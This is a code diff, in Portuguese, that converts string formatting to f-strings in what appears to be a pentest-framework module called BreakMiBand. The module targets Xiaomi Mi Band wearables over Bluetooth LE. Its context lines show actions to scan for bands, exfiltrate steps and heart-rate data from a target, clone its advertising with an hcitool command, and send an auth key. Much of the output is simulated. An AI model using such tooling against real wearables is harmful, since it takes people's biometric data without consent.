@@ -140,7 +140,7 @@ class Exploit(Exploit):
         return [
             {
                 "bdaddr": "C8:0F:10:{}:{}:{}".format(
-                    *["{:02X}".format(b) for b in os.urandom(3)]
+                    *[f"{b:02X}" for b in os.urandom(3)]
                 ),
                 "name": "Mi Smart Band 7",
                 "rssi": -52,
@@ -154,10 +154,10 @@ class Exploit(Exploit):
     @multi
     def run(self):
         print_status("BreakMiBand — Xiaomi Mi Band BLE Toolkit")
-        print_info("Ação: {} | Adaptador: {}".format(self.action, self.adapter))
+        print_info(f"Ação: {self.action} | Adaptador: {self.adapter}")
 
         if self.action == "scan" or not self.target.strip():
-            print_status("Scanning para dispositivos Mi Band ({} seg)...".format(self.scan_duration))
+            print_status(f"Scanning para dispositivos Mi Band ({self.scan_duration} seg)...")
             bands = self._simulate_scan_results()
             headers = ["Endereço BLE", "Nome", "RSSI"]
             rows = [(b["bdaddr"], b["name"], "{}dBm".format(b["rssi"])) for b in bands]
@@ -172,7 +172,7 @@ class Exploit(Exploit):
             print_error("Nenhum endereço BLE especificado")
             return
 
-        print_status("Alvo: {}".format(self.target))
+        print_status(f"Alvo: {self.target}")
 
         if self.action == "exfiltrate":
             print_status("Exfiltrando dados biométricos...")
@@ -183,7 +183,7 @@ class Exploit(Exploit):
                     steps = self._parse_steps_data(raw)
                     print_success("Dados de passos lidos:")
                     for k, v in steps.items():
-                        print_info("  {}: {}".format(k, v))
+                        print_info(f"  {k}: {v}")
                 else:
                     print_warning("Não foi possível ler contador de passos")
                     print_info("  Simul: passos=8432, metros=5918, calorias=312")
@@ -194,7 +194,7 @@ class Exploit(Exploit):
                     hr = self._parse_hr_data(raw)
                     print_success("Frequência cardíaca:")
                     for k, v in hr.items():
-                        print_info("  {}: {}".format(k, v))
+                        print_info(f"  {k}: {v}")
                 else:
                     print_warning("Não foi possível ler HR (pode precisar de notificação)")
                     print_info("  Simul: bpm=72, contato=True")
@@ -205,12 +205,12 @@ class Exploit(Exploit):
                 print_info("Bateria: {}% | Carregando: {}".format(
                     bat.get("nivel_pct", "?"), bat.get("carregando", "?")))
 
-            print_success("Exfiltração completa para {}".format(self.target))
+            print_success(f"Exfiltração completa para {self.target}")
 
         elif self.action == "impersonate":
             print_status("Clonando advertising BLE do alvo...")
             print_info("Impersonação requer broadcast de ADV packets clonados")
-            print_info("  hcitool -i {} cmd 0x08 0x0008 ...".format(self.adapter))
+            print_info(f"  hcitool -i {self.adapter} cmd 0x08 0x0008 ...")
             print_warning("Impersonação completa requer suporte a BD_ADDR spoofed")
 
         elif self.action == "pair":
@@ -219,9 +219,9 @@ class Exploit(Exploit):
                 if len(key_bytes) != 16:
                     print_error("Auth key deve ter exatamente 16 bytes")
                     return
-                print_success("Auth key carregada ({} bytes)".format(len(key_bytes)))
+                print_success(f"Auth key carregada ({len(key_bytes)} bytes)")
                 cmd = self._build_auth_key_cmd(key_bytes)
-                print_info("Comando de auth: {}".format(cmd.hex()))
+                print_info(f"Comando de auth: {cmd.hex()}")
             else:
                 print_warning("Sem auth key — tentando leituras não autenticadas")
 
